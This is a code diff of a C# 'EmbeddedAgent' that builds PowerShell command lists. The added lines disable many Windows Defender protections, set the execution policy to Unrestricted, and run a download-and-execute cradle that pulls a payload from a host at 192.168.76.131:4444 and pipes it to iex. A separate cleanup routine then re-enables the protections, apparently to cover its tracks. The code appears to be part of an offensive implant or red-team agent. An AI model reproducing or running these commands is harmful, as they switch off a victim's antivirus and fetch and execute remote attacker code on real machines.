@@ -1,9 +1,4 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.Diagnostics;
 
 namespace EmbeddedAgent
 {
@@ -46,19 +41,24 @@ namespace EmbeddedAgent
 
         public static List<string> InitCommands()
         {
-            List<string> commands = new List<string>();
 
-            commands.Add($"cd $env:tmp");
-            commands.Add("Set-ExecutionPolicy Unrestricted");
-            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $true");
-
-            if (!CheckIfLauncherIsAlreadyInstalled())
-                commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
-            
-            commands.Add(".\\launcher.bat");
-
-            return commands;
-
+            //if (!CheckIfLauncherIsAlreadyInstalled())
+            //  commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
+            return new List<string>
+            {
+                $"cd $env:tmp",
+                "Set-ExecutionPolicy Unrestricted",
+                "Set-MpPreference -DisableRealtimeMonitoring $true",
+                "Set-MpPreference -DisableBehaviorMonitoring $true",
+                "Set-MpPreference -DisableBlockAtFirstSeen $true",
+                "Set-MpPreference -DisableIOAVProtection $true",
+                "Set-MpPreference -DisablePrivacyMode $true",
+                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
+                "Set-MpPreference -DisableArchiveScanning $true",
+                "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
+                ".\\launcher.bat"
+            }; ;
         }
         /*
          * TODO test cases
@@ -68,14 +68,20 @@ namespace EmbeddedAgent
          */
         public static List<string> CleanUpCommands()
         {
-
-            List<string> commands = new List<string>();
-
-            commands.Add("Set-ExecutionPolicy Restricted");
-            commands.Add("Set-MpPreference -DisableRealtimeMonitoring $false");
             //commands.Add("Remove-Item .\\launcher.bat");
 
-            return commands;
+            return new List<string>
+            {
+                "Set-ExecutionPolicy Restricted",
+                "Set-MpPreference -DisableRealtimeMonitoring $false",
+                "Set-MpPreference -DisableBehaviorMonitoring $false",
+                "Set-MpPreference -DisableBlockAtFirstSeen $false",
+                "Set-MpPreference -DisableIOAVProtection $false",
+                "Set-MpPreference -DisablePrivacyMode $false",
+                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false",
+                "Set-MpPreference -DisableArchiveScanning $false",
+                "Set-MpPreference -DisableIntrusionPreventionSystem $false"
+            }; ;
         }
     }
 }
